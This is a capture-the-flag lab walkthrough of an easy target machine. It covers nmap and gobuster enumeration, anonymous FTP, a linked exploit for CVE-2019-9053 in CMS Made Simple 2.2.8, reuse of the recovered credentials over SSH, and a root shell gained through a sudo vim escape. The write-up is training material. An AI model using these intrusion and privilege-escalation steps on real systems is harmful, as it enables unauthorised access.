# Lunch the Machine Walkthrough

> Target IP: 10.113.139.247  
> Difficulty: Easy  
> Topics: Enumeration | Web Exploitation | Privilege Escalation

---

# Reconnaissance

The first thing I did was run an Nmap scan to identify open ports and services:

```bash
nmap -sV 10.113.139.247
```

The scan revealed three open ports:

- **21** — FTP (`vsftpd 3.0.3`)
- **80** — Apache Web Server
- **22** — SSH

FTP and the web server looked especially interesting, so I started enumerating those.

---

# FTP Enumeration

I first tested anonymous FTP login:

```bash
ftp 10.113.139.247
```

Login with:

```bash
Username: anonymous
Password: [Press Enter]
```

Anonymous login worked successfully, but after exploring the files available on the FTP server, there was nothing useful.

Since FTP was a dead end, I moved on to the web server.

---

# Web Enumeration

To discover hidden directories, I ran Gobuster:

```bash
gobuster dir -u http://10.113.139.247 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
```

Gobuster returned an interesting result:

```bash
/simple
```

Browsing to:

```bash
http://10.113.139.247/simple
```

revealed **CMS Made Simple**.

After inspecting the site, I found the version was:

```bash
2.2.8
```

---

# Exploitation

I searched for known vulnerabilities affecting this version and found:

**CVE-2019-9053**

A working exploit was available on GitHub:

https://github.com/Perseus99999/CVE-2019-9053-working-/blob/main/exploit.py

After downloading and running the exploit, it returned credentials:

```bash
Username: mitch
Password: secret
```

I first tried logging into the CMS admin panel at:

```bash
http://10.113.139.247/simple/admin
```

The credentials worked, but I didn’t find anything useful there.

Then I remembered SSH was open from the Nmap scan, so I tried reusing the credentials there.

---

# Initial Access

SSH login:

```bash
ssh mitch@10.113.139.247
```

Password:

```bash
secret
```

And we get a shell.

---

# User Flag

Listing the files in Mitch’s home directory:

```bash
ls
```

revealed:

```bash
user.txt
```

Reading it gives the first flag:

```bash
cat user.txt
```

User flag captured.

---

# Privilege Escalation

Next step was checking sudo permissions:

```bash
sudo -l
```

Interesting result:

```bash
(root) NOPASSWD: /usr/bin/vim
```

The user can run **vim** as root.

Checking GTFOBins for Vim privilege escalation techniques showed this:

```bash
vim -c ':!/bin/sh'
```

Running it spawned a root shell.

---

# Root Flag

Now move into the root directory:

```bash
cd /root
ls
```

We find:

```bash
root.txt
```

Read the flag:

```bash
cat root.txt
```

Root flag captured.




